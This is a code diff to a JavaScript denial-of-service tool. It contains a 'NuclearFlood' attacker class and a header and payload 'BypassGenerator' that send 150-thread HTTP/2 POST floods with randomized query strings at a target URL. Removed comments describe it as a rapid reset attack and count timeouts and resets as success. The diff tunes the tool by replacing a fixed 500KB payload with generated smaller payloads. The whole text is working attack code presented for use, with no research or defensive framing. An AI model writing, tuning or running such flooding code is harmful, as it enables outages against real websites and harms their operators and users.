@@ -212,14 +212,13 @@ class BypassGenerator {
 }
 
 class NuclearFlood {
-    constructor(targetUrl, threadCount, delay, stats, bypasser, largePayload) {
+    constructor(targetUrl, threadCount, delay, stats, bypasser) {
         this.targetUrl = targetUrl;
         this.threadCount = threadCount;
         this.delay = delay;
         this.stats = stats;
         this.running = false;
         this.bypasser = bypasser;
-        this.largePayload = largePayload;
         try {
             this.url = new URL(targetUrl);
         } catch (e) { this.url = null; }
@@ -231,21 +230,21 @@ class NuclearFlood {
 
         const strategy = Math.random();
 
-        if (strategy < 0.7) {
+        if (strategy < 0.5) {
             const method = 'POST';
             const path = this.url.pathname + (this.url.search ? `${this.url.search}&${generateRandomString(8)}=${Date.now()}` : `?${generateRandomString(8)}=${Date.now()}`);
             const headers = this.bypasser.generateHeaders();
             
-            const randomPayload = this.largePayload;
+            const smallPayload = this.bypasser.generateComplexPayload();
 
             const options = {
                 method: method,
                 headers: {
                     ...headers,
-                    'Content-Type': 'application/octet-stream',
-                    'Content-Length': randomPayload.length,
+                    'Content-Type': smallPayload.contentType,
+                    'Content-Length': Buffer.byteLength(smallPayload.body),
                 },
-                body: randomPayload,
+                body: smallPayload.body,
                 http2: true,
                 timeout: { request: 8000 },
                 retry: { limit: 0 },
@@ -280,15 +279,12 @@ class NuclearFlood {
                 // this would crash the entire worker process.
                 req.on('error', () => {});
 
-                // Simply destroy the request. The outcome will be handled by the stream's 'error' event.
                 req.destroy();
             });
             stream.on('error', (error) => {
-                // For a rapid reset attack, errors like timeout, reset, or abort are expected and indicate success.
                 if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT' || error.code === 'ECONNRESET' || (error.message && error.message.includes('aborted'))) {
                     this.stats.success++;
                 } else {
-                    // Only count as failed if it's an unexpected error.
                     this.stats.failed++;
                 }
             });
@@ -325,10 +321,6 @@ process.on('message', async ({ targetUrl, duration }) => {
     const threads = 150;
     const l7Delay = 900;
 
-    // Payload size set to 500KB as requested to improve stability.
-    const PAYLOAD_SIZE = 500 * 1024;
-    const largePayload = crypto.randomBytes(PAYLOAD_SIZE);
-
     const bypasser = new BypassGenerator();
 
     const stats = { total: 0, success: 0, failed: 0, phase: 'NuclearFlood' };
@@ -360,7 +352,7 @@ process.on('message', async ({ targetUrl, duration }) => {
     const totalDurationMs = duration * 1000;
 
     console.log(`[${new Date().toISOString()}] Starting attacker: NuclearFlood for ${duration}s`);
-    const attacker = new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser, largePayload);
+    const attacker = new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser);
 
     if (!attacker.url) {
         console.error("NuclearFlood attacker could not be initialized. Invalid URL. Stopping worker.");
